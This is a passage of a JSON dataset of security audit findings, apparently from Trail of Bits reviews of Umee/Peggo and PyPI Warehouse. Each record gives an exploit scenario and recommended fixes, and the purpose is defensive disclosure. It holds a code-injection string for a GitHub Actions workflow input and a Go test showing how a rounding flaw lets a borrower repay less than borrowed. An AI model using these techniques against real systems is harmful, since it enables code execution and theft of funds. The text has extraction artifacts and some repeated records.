overly broad permissions. Document the risks associated with storing a keyring password in the conguration le. Improve the price-feeder s keyring-related documentation. Include a link to the Cosmos SDK keyring documentation so that users can learn about dierent keyring back ends and the addition of keyring entries, among other concepts. 26. Insu\u0000cient validation of genesis parameters Severity: Low Diculty: High Type: Data Validation Finding ID: TOB-UMEE-26 Target: Genesis parameters",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "27. Potential overows in Peggo's current block calculations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "In a few code paths, Peggo calculates the number of a delayed block by subtracting a delay value from the latest block number. This subtraction will result in an overow and cause Peggo to operate incorrectly if it is run against a blockchain node whose latest block number is less than the delay value. We set the severity of this nding to informational because the issue is unlikely to occur in practice; moreover, it is easy to have Peggo wait to perform the calculation until the latest block number is one that will not cause an overow. An overow may occur in the following methods:  gravityOrchestrator.GetLastCheckedBlock (gure 27.1)  gravityOrchestrator.CheckForEvents  gravityOrchestrator.EthOracleMainLoop  gravityRelayer.FindLatestValset // add delay to ensure minimum confirmations are received and block is finalized currentBlock := latestHeader.Number.Uint64() - ethBlockConfirmationDelay Figure 27.1: peggo/orchestrator/oracle_resync.go#L35-L42 Recommendations Short term, have Peggo wait to calculate the current block number until the blockchain for which Peggo was congured reaches a block number that will not cause an overow.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "28. Peggo does not validate Ethereum address formats ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "In several code paths in the Peggo codebase, the go-ethereum HexToAddress function (gure 28.1) is used to parse Ethereum addresses. This function does not return an error when the format of the address passed to it is incorrect. The HexToAddress function is used in tests as well as in the following parts of the codebase:  peggo/cmd/peggo/bridge.go#L143 (in the peggo deploy-gravity command, to parse addresses fetched from gravityQueryClient )  peggo/cmd/peggo/bridge.go#L403 (in parsing of the peggo send-to-cosmos command's token-address argument)  peggo/cmd/peggo/orchestrator.go#L150 (in the peggo orchestrator [gravity-addr] command)  peggo/cmd/peggo/bridge.go#L536 and twice in #L545-L555  peggo/cmd/peggo/keys.go#L199 , #L274 , and #L299  peggo/orchestrator/ethereum/gravity/message_signatures.go#L36 , #L40 , #L102 , and #L117  p eggo/orchestrator/ethereum/gravity/submit_batch.go#L53 , #L72 , #L94 , #L136 , and #L144  peggo/orchestrator/ethereum/gravity/valset_update.go#L37 , #L55 , and #L87  peggo/orchestrator/main_loops.go#L307  peggo/orchestrator/relayer/batch_relaying.go#L81-L82 , #L237 , and #L250 We set the severity of this nding to undetermined because time constraints prevented us from verifying the impact of the issue. However, without additional validation of the addresses fetched from external sources, Peggo may operate on an incorrect Ethereum address. // HexToAddress returns Address with byte values of s. // If s is larger than len(h), s will be cropped from the left. func HexToAddress( s string ) Address { return BytesToAddress( FromHex(s) ) } // FromHex returns the bytes represented by the hexadecimal string s. // s may be prefixed with \"0x\". func FromHex(s string ) [] byte { if has0xPrefix(s) { s = s[ 2 :] } if len (s)% 2 == 1 { s = \"0\" + s } return Hex2Bytes(s) } // Hex2Bytes returns the bytes represented by the hexadecimal string str. func Hex2Bytes(str string ) [] byte { h, _ := hex.DecodeString(str) return h } Figure 28.1: The HexToAddress function, which calls the BytesToAddress , FromHex , and Hex2Bytes functions, ignores any errors that occur during hex-decoding. Recommendations Short term, review the code paths that use the HexToAddress function, and use a function like ValidateEthAddress to validate Ethereum address string formats before calls to HexToAddress . Long term, add tests to ensure that all code paths that use the HexToAddress function properly validate Ethereum address strings before parsing them.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "29. Peggo takes an Ethereum private key as a command-line argument ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "Certain Peggo commands take an Ethereum private key ( --eth-pk ) as a command-line argument. If an attacker gained access to a user account on a system running Peggo, the attacker would also gain access to any Ethereum private key passed through the command line. The attacker could then use the key to steal funds from the Ethereum account. $ peggo orchestrator {gravityAddress} \\ --eth-pk= $ETH_PK \\ --eth-rpc= $ETH_RPC \\ --relay-batches= true \\ --relay-valsets= true \\ --cosmos-chain-id=... \\ --cosmos-grpc= \"tcp://...\" \\ --tendermint-rpc= \"http://...\" \\ --cosmos-keyring=... \\ --cosmos-keyring-dir=... \\ --cosmos-from=... Figure 29.1: An example of a Peggo command line In Linux, all users can inspect other users commands and their arguments. A user can enable the proc lesystem's hidepid=2 gid=0 mount options to hide metadata about spawned processes from users who are not members of the specied group. However, in many Linux distributions, those options are not enabled by default. Exploit Scenario An attacker gains access to an unprivileged user account on a system running the Peggo orchestrator. The attacker then uses a tool such as pspy to inspect processes run on the system. When a user or script launches the Peggo orchestrator, the attacker steals the Ethereum private key passed to the orchestrator. Recommendations Short term, avoid using a command-line argument to pass an Ethereum private key to the Peggo program. Instead, fetch the private key from the keyring.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "30. Peggo allows the use of non-local unencrypted URL schemes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "The peggo orchestrator command takes --tendermint-rpc and --cosmos-grpc ags specifying Tendermint and Cosmos remote procedure call (RPC) URLs. If an unencrypted non-local URL scheme (such as http://<some-external-ip>/) is passed to one of those ags, Peggo will not reject it or issue a warning to the user. As a result, an attacker connected to the same local network as the system running Peggo could launch a man-in-the-middle attack, intercepting and modifying the network trac of the device. $ peggo orchestrator {gravityAddress} \\ --eth-pk= $ETH_PK \\ --eth-rpc= $ETH_RPC \\ --relay-batches= true \\ --relay-valsets= true \\ --cosmos-chain-id=... \\ --cosmos-grpc= \"tcp://...\" \\ --tendermint-rpc= \"http://...\" \\ --cosmos-keyring=... \\ --cosmos-keyring-dir=... \\ --cosmos-from=... Figure 30.1: The problematic ags Exploit Scenario A user sets up Peggo with an external Tendermint RPC address and an unencrypted URL scheme (http://). An attacker on the same network performs a man-in-the-middle attack, modifying the values sent to the Peggo orchestrator to his advantage. Recommendations Short term, warn users that they risk a man-in-the-middle attack if they set the RPC endpoint addresses to external hosts that use unencrypted schemes such as http://.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "31. Lack of prioritization of Peggo orchestrator messages ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "Peggo orchestrator messages, like oracle messages ( TOB-UMEE-20 ), are not prioritized over other transactions for inclusion in a block. As a result, if the network is highly congested, orchestrator transactions may not be included in the earliest possible block. Although the Umee system could increase the fee charged for including a Peggo orchestrator message in a block, that solution is suboptimal and may not work. Tactics for prioritizing important transactions include the following:    Using the custom CheckTx implementation introduced in Tendermint version 0.35 , which returns a priority argument Reimplementing part of the Tendermint engine , as Terra Money did Using Substrates dispatch classes , which allow developers to mark transactions as normal , operational , or mandatory Exploit Scenario A user sends tokens from Ethereum to Umee by calling Gravity Bridges sendToCosmos function. When validators notice the transaction in the Ethereum logs, they send MsgSendToCosmosClaim messages to Umee. However, 34% of the messages are front-run by an attacker, eectively stopping Umee from acknowledging the token transfer. Recommendations Short term, use a custom CheckTx method to prioritize Peggo orchestrator messages. Long term, ensure that operations that aect the whole system cannot be front-run or delayed by attackers or blocked by network congestion. 32. Failure of a single broadcast Ethereum transaction causes a batch-wide failure Severity: Undetermined Diculty: High Type: Conguration Finding ID: TOB-UMEE-32 Target: Peggo orchestrator",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "33. Peggo orchestrators IsBatchProtable function uses only one price oracle ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "The Peggo orchestrator relays batches of Ethereum transactions only when doing so will be protable (gure 33.1). To determine an operations protability, it uses the price of ETH in USD, which is fetched from a single sourcethe CoinGecko API. This creates a single point of failure, as a hacker with control of the API could eectively choose which batches Peggo would relay by manipulating the price. The IsBatchProfitable function (gure 33.2) fetches the ETH/USD price; the gravityRelayer.priceFeeder eld it uses is set earlier in the getOrchestratorCmd function (gure 33.3). func (s *gravityRelayer) RelayBatches( /* (...) */ ) error { // (...) for tokenContract, batches := range possibleBatches { // (...) // Now we iterate through batches per token type. for _, batch := range batches { // (...) // If the batch is not profitable, move on to the next one. if !s.IsBatchProfitable(ctx, batch.Batch, estimatedGasCost, gasPrice, s.profitMultiplier) { continue } // (...) Figure 33.1: peggo/orchestrator/relayer/batch_relaying.go#L173-L176 func (s *gravityRelayer) IsBatchProfitable( / * (...) */ ) bool { // (...) // First we get the cost of the transaction in USD usdEthPrice, err := s.priceFeeder.QueryETHUSDPrice() Figure 33.2: peggo/orchestrator/relayer/batch_relaying.go#L211-L223 func getOrchestratorCmd() *cobra.Command { cmd := &cobra.Command{ Use: \"orchestrator [gravity-addr]\" , Args: cobra.ExactArgs( 1 ), Short: \"Starts the orchestrator\" , RunE: func (cmd *cobra.Command, args [] string ) error { // (...) coingeckoAPI := konfig.String(flagCoinGeckoAPI) coingeckoFeed := coingecko.NewCoingeckoPriceFeed( /* (...) */ ) // (...) relayer := relayer.NewGravityRelayer( /* (...) */ , relayer.SetPriceFeeder(coingeckoFeed), ) Figure 33.3: peggo/cmd/peggo/orchestrator.go#L162-L188 Exploit Scenario All Peggo orchestrator instances depend on the CoinGecko API. An attacker hacks the CoinGecko API and falsies the ETH/USD prices provided to the Peggo relayers, causing them to relay unprotable batches. Recommendations Short term, address the Peggo orchestrators reliance on a single ETH/USD price feed. Consider using the price-feeder tool to fetch pricing information or reading prices from the Umee blockchain. Long term, implement protections against extreme ETH/USD price changes; if the ETH/USD price changes by too large a margin, have the system stop fetching prices and require an operator to investigate whether the issue was caused by malicious behavior. Additionally, implement tests to check the orchestrators handling of random and extreme changes in the prices reported by the price feed. References  Check Coingecko prices separately from BatchRequesterLoop (GitHub issue)",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "34. Rounding errors may cause the module to incur losses ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "The amount that a user has borrowed is calculated using AdjustedBorrow data and an InterestScalar value. Because the system uses xed-precision decimal numbers that are truncated to integer values, there may be small rounding errors in the computation of those amounts. If an error occurs, it will benet the user, whose repayment will be slightly lower than the amount the user borrowed. Figure 34.1 shows a test case demonstrating this vulnerability. It should be added to the umee/x/leverage/keeper/keeper_test.go le. Appendix G discusses general rounding recommendations. // Test rounding error bug - users can repay less than have borrowed // It should pass func (s *IntegrationTestSuite) TestTruncationBug() { lenderAddr, _ := s.initBorrowScenario() app, ctx := s.app, s.ctx // set some interesting interest scalar _ = s.app.LeverageKeeper.SetInterestScalar(s.ctx, umeeapp.BondDenom, sdk.MustNewDecFromStr( \"2.9\" )) // save initial balances initialSupply := s.app.BankKeeper.GetSupply(s.ctx, umeeapp.BondDenom) s.Require().Equal(initialSupply.Amount.Int64(), int64 ( 10000000000 )) initialModuleBalance := s.app.LeverageKeeper.ModuleBalance(s.ctx, umeeapp.BondDenom) // lender borrows 20 umee err := s.app.LeverageKeeper.BorrowAsset(ctx, lenderAddr, sdk.NewInt64Coin(umeeapp.BondDenom, 20000000 )) s.Require().NoError(err) // lender repays in a few transactions iters := int64 ( 99 ) payOneIter := int64 ( 2000 ) amountDelta := int64 ( 99 ) // borrowed expects to \"earn\" this amount for i := int64 ( 0 ); i < iters; i++ { repaid, err := s.app.LeverageKeeper.RepayAsset(ctx, lenderAddr, sdk.NewInt64Coin(umeeapp.BondDenom, payOneIter)) s.Require().NoError(err) s.Require().Equal(sdk.NewInt(payOneIter), repaid) } // lender repays remaining debt - less than he borrowed // we send 90000000, because it will be truncated to the actually owned amount repaid, err := s.app.LeverageKeeper.RepayAsset(ctx, lenderAddr, sdk.NewInt64Coin(umeeapp.BondDenom, 90000000 )) s.Require().NoError(err) s.Require().Equal(repaid.Int64(), 20000000 -(iters*payOneIter)-amountDelta) // verify lender's new loan amount in the correct denom (zero) loanBalance := s.app.LeverageKeeper.GetBorrow(ctx, lenderAddr, umeeapp.BondDenom) s.Require().Equal(loanBalance, sdk.NewInt64Coin(umeeapp.BondDenom, 0 )) // we expect total supply to not change finalSupply := s.app.BankKeeper.GetSupply(s.ctx, umeeapp.BondDenom) s.Require().Equal(initialSupply, finalSupply) // verify lender's new umee balance // should be 10 - 1k from initial + 20 from loan - 20 repaid = 9000 umee // it is more -> borrower benefits tokenBalance := app.BankKeeper.GetBalance(ctx, lenderAddr, umeeapp.BondDenom) s.Require().Equal(tokenBalance, sdk.NewInt64Coin(umeeapp.BondDenom, 9000000000 +amountDelta)) // in test, we didn't pay interest, so module balance should not have changed // but it did because of rounding moduleBalance := s.app.LeverageKeeper.ModuleBalance(s.ctx, umeeapp.BondDenom) s.Require().NotEqual(moduleBalance, initialModuleBalance) s.Require().Equal(moduleBalance.Int64(), int64 ( 1000000000 -amountDelta)) } Figure 34.1: A test case demonstrating the rounding bug Exploit Scenario An attacker identies a high-value coin. He takes out a loan and repays it in a single transaction and then repeats the process again and again. By using a single transaction for both operations, he evades the borrowing fee (i.e., the interest scalar is not increased). Because of rounding errors in the systems calculations, he turns a prot by repaying less than he borrowed each time. His prots exceed the transaction fees, and he continues his attack until he has completely drained the module of its funds. Exploit Scenario 2 The Umee system has numerous users. Each user executes many transactions, so the system must perform many calculations. Each calculation with a rounding error causes it to lose a small amount of tokens, but eventually, the small losses add up and leave the system without the essential funds. Recommendations Short term, always use the rounding direction that will benet the module rather than the user. Long term, to ensure that users pay the necessary fees, consider prohibiting them from borrowing and repaying a loan in the same block. Additionally, use fuzz testing to ensure that it is not possible for users to secure free tokens. References  How to Become a Millionaire, 0.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "35. Outdated and vulnerable dependencies ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "Both Umee and Peggo rely on outdated and vulnerable dependencies. The table below lists the problematic packages used by Umee dependencies; the yellow rows indicate packages that were also detected in Peggo dependencies. We set the severity of this nding to undetermined because we could not conrm whether these vulnerabilities aect Umee or Peggo. However, they likely do not, since most of the CVEs are related to binaries or components that are not run in the Umee or Peggo code. Package Vulnerabilities golang/github.com/coreos/etc d@3.3.13 pkg:golang/github.com/dgrija lva/jwt-go@3.2.0 CVE-2020-15114 CVE-2020-15136 CVE-2020-15115 CVE-2020-26160 golang/github.com/microcosm- cc/bluemonday@1.0.4 #111 (CWE-79) golang/k8s.io/kubernetes@1.1 3.0 CVE-2020-8558, CVE-2019-11248, CVE-2019-11247, CVE-2019-11243, CVE-2021-25741, CVE-2019-9946, CVE-2020-8552, CVE-2019-11253, CVE-2020-8559, CVE-2021-25735, CVE-2019-11250, CVE-2019-11254, CVE-2019-11249, CVE-2019-11246, CVE-2019-1002100, CVE-2020-8555, CWE-601, CVE-2019-11251, CVE-2019-1002101, CVE-2020-8563, CVE-2020-8557, CVE-2019-11244 Recommendations Short term, update the outdated and vulnerable dependencies. Even if they do not currently aect Umee or Peggo, a change in the way they are used could introduce a bug. Long term, integrate a dependency-checking tool such as nancy into the CI/CD pipeline. Frequently update any direct dependencies, and ensure that any indirect dependencies in upstream libraries remain up to date. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "25. Insecure storage of price-feeder keyring passwords ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "Users can store oracle keyring passwords in the price-feeder conguration le. However, the price-feeder stores these passwords in plaintext and does not provide a warning if the conguration le has overly broad permissions (like those shown in gure 25.1). Additionally, neither the price-feeder README nor the relevant documentation string instructs users to provide keyring passwords via standard input (gure 25.2), which is a safer approach. Moreover, neither source provides information on dierent keyring back ends, and the example price-feeder conguration uses the \"test\" back end . An attacker with access to the conguration le on a users system, or to a backup of the conguration le, could steal the users keyring information and hijack the price-feeder oracle instance. $ ls -la ./price-feeder/price-feeder.example.toml -rwx rwxrwx 1 dc dc 848 Feb 6 10:37 ./price-feeder/price-feeder.example.toml $ grep pass ./price-feeder/price-feeder.example.toml pass = \"exampleKeyringPassword\" $ ~/go/bin/price-feeder ./price-feeder/price-feeder.example.toml 10:42AM INF starting price-feeder oracle... 10:42AM ERR oracle tick failed error=\"key with addressA4F324A31DECC0172A83E57A3625AF4B89A91F1Fnot found: key not found\" module=oracle 10:42AM INF starting price-feeder server... listen_addr=0.0.0.0:7171 Figure 25.1: The price-feeder does not warn the user if the conguration le used to store the keyring password in plaintext has overly broad permissions. // CreateClientContext creates an SDK client Context instance used for transaction // generation, signing and broadcasting. func (oc OracleClient) CreateClientContext() (client.Context, error ) { var keyringInput io.Reader if len (oc.KeyringPass) > 0 { keyringInput = newPassReader(oc.KeyringPass) } else { keyringInput = os.Stdin } Figure 25.2: The price-feeder supports the use of standard input to provide keyring passwords. ( umee/price-feeder/oracle/client/client.go#L184-L192 ) Exploit Scenario A user sets up a price-feeder oracle and stores the keyring password in the price-feeder conguration le, which has been miscongured with overly broad permissions. An attacker gains access to another user account on the user's machine and is able to read the price-feeder oracle's keyring password. The attacker uses that password to access the keyring data and can then control the user's oracle account. Recommendations Short term, take the following steps:     Recommend that users provide keyring passwords via standard input. Check the permissions of the conguration le. If the permissions are too broad, provide an error warning the user of the issue, as openssh does when it nds that a private key le has overly broad permissions. Document the risks associated with storing a keyring password in the conguration le. Improve the price-feeder s keyring-related documentation. Include a link to the Cosmos SDK keyring documentation so that users can learn about dierent keyring back ends and the addition of keyring entries, among other concepts.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "26. Insu\u0000cient validation of genesis parameters ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "A few system parameters must be set correctly for the system to function properly. The system checks the parameter input against minimum and maximum values (not always correctly) but does not check the correctness of the parameters dependencies. Exploit Scenario When preparing a protocol upgrade, the Umee team accidentally introduces an invalid value into the conguration le. As a result, the upgrade is deployed with an invalid or unexpected parameter. Recommendations Short term, implement proper validation of congurable values to ensure that the following expected invariants hold:  BaseBorrowRate <= KinkBorrowRate <= MaxBorrowRate  LiquidationIncentive <= some maximum  CompleteLiquidationThreshold > 0 (The third invariant is meant to prevent division by zero in the Interpolate method.)",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "31. Lack of prioritization of Peggo orchestrator messages ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "Peggo orchestrator messages, like oracle messages ( TOB-UMEE-20 ), are not prioritized over other transactions for inclusion in a block. As a result, if the network is highly congested, orchestrator transactions may not be included in the earliest possible block. Although the Umee system could increase the fee charged for including a Peggo orchestrator message in a block, that solution is suboptimal and may not work. Tactics for prioritizing important transactions include the following:    Using the custom CheckTx implementation introduced in Tendermint version 0.35 , which returns a priority argument Reimplementing part of the Tendermint engine , as Terra Money did Using Substrates dispatch classes , which allow developers to mark transactions as normal , operational , or mandatory Exploit Scenario A user sends tokens from Ethereum to Umee by calling Gravity Bridges sendToCosmos function. When validators notice the transaction in the Ethereum logs, they send MsgSendToCosmosClaim messages to Umee. However, 34% of the messages are front-run by an attacker, eectively stopping Umee from acknowledging the token transfer. Recommendations Short term, use a custom CheckTx method to prioritize Peggo orchestrator messages. Long term, ensure that operations that aect the whole system cannot be front-run or delayed by attackers or blocked by network congestion.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "32. Failure of a single broadcast Ethereum transaction causes a batch-wide failure ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "The Peggo orchestrator broadcasts Ethereum events as Cosmos messages and sends them in batches of 10 ( at least by default ). According to a code comment (gure 32.1), if the execution of a single message fails on the Umee side, all of the other messages in the batch will also be ignored. We set the severity of this nding to undetermined because it is unclear whether it is exploitable. // runTx processes a transaction within a given execution mode, encoded transaction // bytes, and the decoded transaction itself. All state transitions occur through // a cached Context depending on the mode provided. State only gets persisted // if all messages get executed successfully and the execution mode is DeliverTx. // Note, gas execution info is always returned. A reference to a Result is // returned if the tx does not run out of gas and if all the messages are valid // and execute successfully. An error is returned otherwise. func (app *BaseApp) runTx(mode runTxMode, txBytes [] byte , tx sdk.Tx) (gInfo sdk.GasInfo, result *sdk.Result, err error ) { Figure 32.1: cosmos-sdk/v0.45.1/baseapp/baseapp.go#L568-L575 Recommendations Short term, review the practice of ignoring an entire batch of Peggo-broadcast Ethereum events when the execution of one of them fails on the Umee side, and ensure that it does not create a denial-of-service risk. Alternatively, change the system such that it can identify any messages that will fail and exclude them from the batch. Long term, generate random messages corresponding to Ethereum events and use them in testing to check the systems handling of failed messages.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Unsafe input handling in Combine PRs workow ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "Unsanitized user input is directly interpolated into code snippets in the combine pull requests Github Actions workow, which can allow an attacker with enough permissions to execute this workow to perform arbitrary code execution in the context of the workow job. These workows use the ${{  }} notation to insert user input into small JavaScript programs. This approach performs no validation of the data, and the value interpolation is performed before the program execution, which means that specially crafted input can change the code being executed. For instance, in gure 1.1, the ignoreLabel input is interpolated as part of a string. An attacker may execute arbitrary code by providing a specially crafted string in ignoreLabel , as shown in the exploit scenario. const searchString = `repo: ${ context.repo.owner } / ${ context.repo.repo } is:pr is:open label:dependencies label:python -label: ${ { github.event.inputs.ignoreLabel } } ` ; Figure 1.1: The ignoreLabel input is injected as part of a string ( warehouse/.github/workflows/combine-prs.yml#47 ) A similar issue exists in the code shown in gure 1.2, as combineBranchName is also interpolated unsafely. await github.rest.actions.createWorkflowDispatch({ owner: context.repo.owner, repo: context.repo.repo, workflow_id: workflow_id, ref: ' ${{ github.event.inputs.combineBranchName }} ' }); Figure 1.2: The combineBranchName input is injected as part of a string ( warehouse/.github/workflows/combine-prs.yml#181186 ) Both of these scripts are run with a GitHub token with write permissions over the repository, pull requests, and actions. An attacker may use these non-default permissions to their advantage. permissions : contents : write pull-requests : write actions : write Figure 1.3: Combine PRs workow permissions ( warehouse/.github/workflows/combine-prs.yml#2528 ) This issue is informational, as this workow can only be triggered manually via workflow_dispatch , which in turn requires users to be a repository collaborator with write access . Exploit Scenario An attacker with permissions to trigger an execution of the Combine PRs workow runs it with ignoreLabel set to `+(function(){console.log(`hack`);return``;})()+` . Their code gets executed as part of the workow. Recommendations Short term, replace value interpolation in code with a safer alternative, such as environment variables in an env: block, and their corresponding access through process.env.VARIABLE in JavaScript. Long term, review the GitHub Actions documentation and be aware of best practices and common issues. Consider all user input as unsafe, and do not interpolate it in code or scripts. References  Keeping your GitHub Actions and workows secure Part 2: Untrusted input , from the GitHub Security Lab",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Weak signatures used in AWS SNS verication ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "Warehouse has an endpoint for AWS SNS webhooks, which it uses to listen for messages related to Warehouses use of AWS SES for emails. To prevent impersonation or malicious modication, AWS SNS includes a digital signature in each payload, along with a URL that points to a public-key bearing certicate that can be used to verify the signature. Warehouse correctly veries the digital signature and ensures that the certicate URL is on a trusted domain, but does so using PKCS#1v1.5 with SHA-1, which is known to be vulnerable to certicate forgery. try : pubkey.verify(signature, data, PKCS1v15(), SHA1()) except _InvalidSignature: raise InvalidMessageError( \"Invalid Signature\" ) from None Figure 2.1: PKCS#1v1.5 with SHA-1 signature verication of SNS payloads ( warehouse/warehouse/utils/sns.py#6972 ) Exploit Scenario The integrity of the PKCS#1v1.5 signing scheme depends entirely on the collision resistance of the underlying cryptographic digest used. SHA-1 has been vulnerable to practical collision attacks for several years ; an attacker with moderate computational resources could leverage these attacks to produce an illegitimate signature that would be veried by the public key presented in the AWS SNS scheme. This, in turn, would allow an attacker to inauthentically control Warehouses SNS topic subscriptions, as well as le false bounce/complaint notices against email addresses. We currently characterize the diculty of this attack as undetermined, pending further investigation into AWS SNSs key rotation practices. A suciently rapid key rotation policy would likely make certicate forgery impractical, but relies on an external party (AWS) to maintain an appropriate rotation cadence in the face of increasingly performant SHA-1 collision techniques. Recommendations PyPI should congure its SNS Topic Attributes to avoid PKCS#1v1.5 with SHA-1. In particular, AWS SNS supports PKCS#1v1.5 with SHA256 instead which, while still not ideal, is still considered secure for digital signatures due to SHA256s collision resistance.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "3. Vulnerable dependencies in Cabotage ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "We performed an audit of Cabotages dependencies (as listed in requirements.txt ) and discovered multiple dependencies with publicly disclosed vulnerabilities, including dependencies used for cryptographic and PKI operations: Name Version ID Fix Versions certifi 2022.12.7 PYSEC-2023-135 2023.7.22 cryptography 39.0.1 PYSEC-2023-112 41.0.2 cryptography 39.0.1 GHSA-5cpq-8wj7-hf2v 41.0.0 cryptography 39.0.1 GHSA-jm77-qphf-c4w8 41.0.3 flask 2.2.2 PYSEC-2023-62 2.2.5,2.3.2 flask-security 3.0.0 GHSA-cg8c-gc2j-2wf7 requests 2.25.1 PYSEC-2023-74 2.31.0 werkzeug 2.2.2 PYSEC-2023-58 2.2.3 werkzeug 2.2.2 PYSEC-2023-57 2.2. Exploit Scenario The vulnerabilities above are publicly known, and Cabotage is an open-source repository; an attacker may inspect each to determine its applicability to Cabotage. We currently characterize the severity of this attack as undetermined, pending a more in-depth analysis of each dependencys vulnerabilities. Depending on severity and relevance, each vulnerability may receive a discrete exploit scenario. Recommendations Short term, upgrade each dependency to a non-vulnerable version, where possible. If no non-vulnerable version exists, either conrm that the vulnerability is not relevant to Cabotages use of the dependency or , if relevant, patch or replace the dependency. Long term, perform automatic dependency auditing within the Cabotage codebase. This can be done either with Dependabot (including automatic x PRs for security issues) or with pip-audit and gh-action-pip-audit .",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Lack of rate limiting on endpoints that send email ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "Warehouse sends notication emails when sensitive actions are performed by users. The following routes can trigger these emails and are not subject to rate limits:  manage.account  manage.account.totp-provision  manage.account.webauthn-provision  manage.account.recovery-codes.regenerate  manage.project.release  manage.project.roles  manage.project.change_role Warehouses @_email decorator does include a rate-limiting mechanism that prevents a single email from being sent too many times; however, it is disabled by default. Warehouse additionally imposes a rate limit on actions that send emails to unveried addresses (such as adding a new unveried address to an account via manage.account ), meaning that some email-sending operations through manage.account are implicitly rate limited. Despite an overall lack of rate limiting on these endpoints, other factors make their use as spam vectors dicult: all require either a veried email address, or require that the victim accept an invitation to an attacker-controlled project. Additionally, none of the emails produced have substantial user-controllable components, other than usernames, project names, and other heavily normalized and escaped elds. Consequently, while an attacker may nd ways to harm PyPIs spam score in these elds, they are not able to inject entirely controlled content into the non-rate-limited emails in question. Exploit Scenario An attacker repeatedly performs a sensitive action. Since there are no rate limiters in place on the endpoints in question, the attacker is able to trigger an unbounded number of notication emails to the attackers own address with Warehouse infrastructure. In some cases, the attacker may also be able to trigger notications to other Warehouse users. This may have a negative impact on PyPIs spam score, and drive up service costs. Recommendations Short term, ensure that these notication emails are rate limited through the API request, with a per-user cross-request rate limit mechanism, or through the existing email rate-limiting mechanism.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Account status information leak for frozen and disabled accounts ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "As part of determining whether to accept a basic authentication ow, Warehouse checks whether the supplied user identity is currently marked as disabled (including being frozen directly by the admins, or disabled due to a compromised password, etc.): if userid is not None : user = login_service.get_user(userid) is_disabled, disabled_for = login_service.is_disabled(user.id) if is_disabled: # Comment excerpted. if disabled_for == DisableReason.CompromisedPassword: raise _format_exc_status( BasicAuthBreachedPassword(), breach_service.failure_message_plain ) elif disabled_for == DisableReason.AccountFrozen: raise _format_exc_status(BasicAuthAccountFrozen(), \"Account is frozen.\" ) else : raise _format_exc_status(HTTPUnauthorized(), \"Account is disabled.\" ) elif login_service.check_password( Figure 5.1: Checking whether the account is disabled during basic auth ( warehouse/warehouse/accounts/security_policy.py#5978 ) Critically, this check happens before the users password is checked, and results in a distinct error message returned to the requesting client without any subsequent check. As a result, an attacker who knows a targets PyPI username can determine their targets account status on PyPI without knowing their password or any other information. This information is not exposed publicly anywhere else on PyPI, making it a potentially useful source of reconnaissance information. Uploading distributions to http://localhost/legacy/ Uploading fakepkg-0.0.2.tar.gz 100%  3.9/3.9 kB  00:00  ? WARNING Error during upload. Retry with the --verbose option for more details. ERROR HTTPError: 401 Unauthorized from http://localhost/legacy/ Account is frozen. Figure 5.2: Example error message produced to authenticating client, even with an invalid password. Exploit Scenario An attacker has access to stolen credentials for PyPI accounts, and wishes to quickly test their validity without loss of stealth. They use the 